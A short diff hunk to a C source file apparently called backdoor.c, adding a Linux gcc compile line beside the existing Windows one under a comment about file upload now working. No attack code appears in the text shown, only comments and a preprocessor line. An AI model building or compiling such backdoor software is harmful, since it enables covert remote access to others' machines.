@@ -13,6 +13,7 @@
 /* --- File upload fully works now :P (All FiXeD) --- */
 
 /* To compile run: gcc -o backdoor.exe backdoor.c -lws2_32
+ * Linux compile run: gcc -o backdoor backdoor.c
  */
 
 #if defined(_WIN32)
